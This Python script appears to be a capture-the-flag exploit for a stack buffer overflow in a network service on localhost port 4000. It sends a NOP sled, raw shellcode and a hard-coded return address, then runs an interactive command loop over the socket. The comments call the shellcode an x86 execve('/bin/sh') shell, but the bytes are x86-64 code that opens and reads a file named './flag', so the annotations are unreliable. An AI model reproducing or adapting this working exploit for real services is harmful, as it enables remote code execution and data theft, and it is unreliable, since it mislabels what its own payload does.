#!/usr/bin/env python3
import socket
import struct
import time

def pad_payload(payload: bytes, target_len: int) -> bytes:
    padding_len = target_len - len(payload)
    return payload + b"\x90" * padding_len
# Shellcode: execve("/bin/sh", NULL, NULL)
# This is a standard x86 Linux shellcode
prepadding=    b"\x90" * 32
shellcode = b"\x48\xB8\x2E\x2F\x66\x6C\x61\x67\x00\x00\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\xC7\xC6\x00\x41\x40\x00\x48\xC7\xC2\x32\x00\x00\x00\x48\xC7\xC0\x00\x00\x00\x00\x0F\x05\x48\xC7\xC0\x6A\x14\x40\x00\xFF\xE0"
padding=    b"\x90" * (312-len(shellcode)-len(prepadding))
returnAddr= b"\x00\x41\x40\x00\x00\x00\x00\x00"

payload = prepadding+shellcode+padding+returnAddr

def exploit():
    # Connect to the service
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 4000))
    
    # Receive the banner
    banner = s.recv(1024)
    print("Received banner")
    
    # Wait for "What is your name?" prompt
    prompt = s.recv(1024)
    print(f"Prompt: {prompt}")
    
    
    # Build the payload
    
    
    # Send the payload
    print(f"Sending {len(payload)} bytes...")
    s.send(payload)
    
    # The shellcode should now be executing
    # Try to interact with the shell
    time.sleep(0.5)
    
    # Send commands to the shell
    try:
        response = s.recv(1024)
        print(f"Response: {response}")
        response = s.recv(1024)
        print(f"Response: {response}")
        response = s.recv(1024)
        print(f"Response: {response}")
        response = s.recv(1024)
        print(f"Response: {response}")
        # Keep the shell open
        print("Shell opened successfully! Type commands:")
        while True:
            cmd = input("$ ") + "\n"
            s.send(cmd.encode())
            response = s.recv(4096)
            print(response.decode(), end='')
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    exploit()